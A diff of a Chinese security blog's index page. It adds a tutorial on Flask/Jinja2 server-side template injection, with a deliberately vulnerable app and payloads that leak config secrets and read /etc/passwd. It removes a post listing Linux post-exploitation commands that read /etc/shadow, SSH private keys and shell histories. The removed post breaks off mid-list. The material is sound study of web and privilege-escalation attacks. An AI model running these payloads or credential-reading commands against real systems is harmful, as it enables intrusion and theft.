@@ -258,6 +258,226 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/SSTI服务器模板注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/28/SSTI服务器模板注入/" itemprop="url">
+                  SSTI服务器模板注入
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T23:17:58+08:00">
+                2018-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/28/SSTI服务器模板注入/" class="leancloud_visitors" data-flag-title="SSTI服务器模板注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间打本校的ctf，有道叫幸运数字的题，只挖到一个xss，看了很久对题完全没有头绪，后来交wp的时候，出题师傅在群里说是SSTI，然后就去百度了一下，复现并学习一下这个漏洞。</p>
+<h2 id="0x01-SSTI服务端模板注入"><a href="#0x01-SSTI服务端模板注入" class="headerlink" title="0x01 SSTI服务端模板注入"></a>0x01 SSTI服务端模板注入</h2><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<p>通常测试模块类型的方式如下图：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti01.png" alt=""></p>
+<h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>前面两篇正好写了python的后端模块flask和jinja2，这次我们使用flask+jinja2框架来测试一下。</p>
+<p>首先后端是python，所以需要python环境，python在官网下载并安装，配置环境变量即可。</p>
+<p>接着我们安装需要用到的库</p>
+<ul>
+<li>pip install jinja2</li>
+<li>pip install flask</li>
+<li>pip install virtualenv</li>
+</ul>
+<p>只要上述所有库成功安装，环境就配置完毕了。</p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>我们的环境需要一个run.py文件和一个templates文件夹，templates文件夹内要有一个index.html。</p>
+<p>index.html内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;% block title %&#125;test pages&#123;% endblock %&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">			&lt;p&gt;请输入你的昵称&lt;/p&gt;</span><br><span class="line">			&lt;form method=&quot;post&quot; action=&quot;/check&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;name&quot; required&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;br&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">	&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，html中只有一个post型的from需要我们填写提交。</p>
+<p>然后是run.py（注意这次我用了python2.7）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#python2.7</span><br><span class="line">import jinja2</span><br><span class="line">from flask import Flask,render_template, render_template_string, flash, redirect, url_for, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = &quot;password:123456789&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/check&apos;,methods=[&apos;POST&apos;, &apos;GET&apos;])</span><br><span class="line">def check():</span><br><span class="line">	if request.method == &apos;POST&apos;:</span><br><span class="line">		name = str(request.form[&apos;name&apos;])</span><br><span class="line">		template = u&apos;&apos;&apos;</span><br><span class="line">		&lt;center&gt;</span><br><span class="line">			&lt;p&gt;你好, %s, 欢迎来到我的页面&lt;/p&gt;</span><br><span class="line">			&lt;a href=&quot;/&quot;&gt;点这里退出&lt;/a&gt;</span><br><span class="line">		&lt;/center&gt;</span><br><span class="line">		&apos;&apos;&apos; % (name)</span><br><span class="line">		return render_template_string(template)</span><br><span class="line">		</span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">	return render_template(&apos;404.html&apos;),404</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
+<p>这里python文件实现了将几个页面通过jinja2模块渲染部署，然后添加了一个敏感数据SECRET_KEY一会用得到，剩下的就是将index.html页面post过来的name，在网站check路径的页面中作为字符串输出。</p>
+<p>我们在run.py目录打开命令行先输入python run.py先将服务运行起来：</p>
+<p>然后我们打开浏览器输入127.0.0.1:5000，成功显示index.html中的页面：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti02.png" alt=""></p>
+<p>我们输入任意字符串，浏览器跳转到127.0.0.1:5000/check目录，并且在网页中输出我们的字符串：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti03.png" alt=""></p>
+<p>如上几步如果都成功，我们漏洞环境就搭建完成了。</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们先尝试一下刚才图中的测试数据，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti04.png" alt=""></p>
+<p>config是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。查看这些配置项目，我们只需注入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现结果中存在我们刚才故意放进去的敏感信息：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti05.png" alt=""></p>
+<p>在接下来的步骤之前，我先介绍两个内省实用程序：<strong>mro</strong>以及<strong>subclasses</strong>属性。</p>
+<p><strong>mro</strong>中的MRO(Method Resolution Order)代表着解析方法调用的顺序，它是每个对象元类的一个隐藏属性，当进行内省时会忽略dir输出。</p>
+<p><strong>subclasses</strong>属性在这里作为一种方法被定义为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p>
+<p><strong>mro</strong>允许我们在当前Python环境中追溯对象继承树，之后<strong>subclasses</strong>又让我们回到原点。从一个new-style object开始，例如str类型。使用<strong>mro</strong>我们可以从继承树爬到根对象类，之后在Python环境中使用<strong>subclasses</strong>爬向每一个new-style object。ok，这让我们能够访问加载到当前Python环境下的所有类。这样，我们就可以实现很多功能。</p>
+<p>首先我们要做的第一件事便是选择一个new-style object用于访问object基类。我们可以使用<strong>mro</strong>属性访问对象的继承类。<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__ &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti06.png" alt=""></p>
+<p>得到反馈只有str、basestring和object，按照数组的排序，我们应该选<strong>mro</strong>的第三个，也就是<strong>mro</strong>[2]，接下来我们构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti07.png" alt=""></p>
+<p>可以查看到非常非常多的可访问类，这个时候我们要找到<type 'file'="">类，它是文件系统访问的关键。</type></p>
+<p>然后我们可以用file类的read()方法访问一下当前目录的文本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;./2333.txt&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti08.png" alt=""></p>
+<p>访问敏感目录可以得到很多信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti09.png" alt=""></p>
+<p>我们就可以参考目标系统目录结构，对目标系统敏感文件进行访问。</p>
+<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><ul>
+<li><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></li>
+<li><a href="http://www.freebuf.com/articles/web/98619.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98619.html</a></li>
+<li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="noopener">https://nvisium.com/blog/2015/12/07/injecting-flask/</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/python-jinja2模块学习/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2404,214 +2624,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/08/内网渗透常用命令总结（linux）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/08/内网渗透常用命令总结（linux）/" itemprop="url">
-                  内网渗透常用命令总结（linux）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-08T21:34:32+08:00">
-                2018-05-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/08/内网渗透常用命令总结（linux）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（linux）">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了windows系统在内网渗透和提权中的常用命令，这篇总结下linux在内网渗透中常用的命令。</p>
-<h2 id="0x01-查看操作系统信息"><a href="#0x01-查看操作系统信息" class="headerlink" title="0x01 查看操作系统信息"></a>0x01 查看操作系统信息</h2><h4 id="操作系统版本"><a href="#操作系统版本" class="headerlink" title="操作系统版本"></a>操作系统版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release      # Debian </span><br><span class="line">cat /etc/redhat-release   # Redhat</span><br></pre></td></tr></table></figure>
-<h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
-<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line">set</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-应用和服务"><a href="#0x02-应用和服务" class="headerlink" title="0x02 应用和服务"></a>0x02 应用和服务</h2><h4 id="正在运行的程序和权限"><a href="#正在运行的程序和权限" class="headerlink" title="正在运行的程序和权限"></a>正在运行的程序和权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br></pre></td></tr></table></figure>
-<p>如果要查询root权限运行的进程，可以补充为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure></p>
-<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archives</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure>
-<h4 id="服务的配置文件"><a href="#服务的配置文件" class="headerlink" title="服务的配置文件"></a>服务的配置文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
-<h4 id="存储的明文用户名，密码"><a href="#存储的明文用户名，密码" class="headerlink" title="存储的明文用户名，密码"></a>存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-网络相关"><a href="#0x03-网络相关" class="headerlink" title="0x03 网络相关"></a>0x03 网络相关</h2><h4 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br></pre></td></tr></table></figure>
-<h4 id="网络配置-DNS-DHCP-网关"><a href="#网络配置-DNS-DHCP-网关" class="headerlink" title="网络配置,DNS,DHCP,网关"></a>网络配置,DNS,DHCP,网关</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br></pre></td></tr></table></figure>
-<h4 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
-<h4 id="路由缓存"><a href="#路由缓存" class="headerlink" title="路由缓存"></a>路由缓存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">route -nee</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-用户相关"><a href="#0x04-用户相关" class="headerlink" title="0x04 用户相关"></a>0x04 用户相关</h2><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos;   # 列出超级用户</span><br><span class="line">awk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&apos; /etc/passwd   #列出超级用户</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<h4 id="列主目录"><a href="#列主目录" class="headerlink" title="列主目录"></a>列主目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br></pre></td></tr></table></figure>
-<h4 id="其他用户的操作记录"><a href="#其他用户的操作记录" class="headerlink" title="其他用户的操作记录"></a>其他用户的操作记录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
-<h4 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
-<h2 id="0x05-文件系统相关"><a href="#0x05-文件系统相关" class="headerlink" title="0x05 文件系统相关"></a>0x05 文件系统相关</h2><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /var/log</span><br><span class="line">ls -alh /var/mail</span><br><span class="line">ls -alh /var/spool</span><br><span class="line">ls -alh /var/spool/lpd</span><br><span class="line">ls -alh /var/lib/pgsql</span><br><span class="line">ls -alh /var/lib/mysql</span><br><span class="line">cat 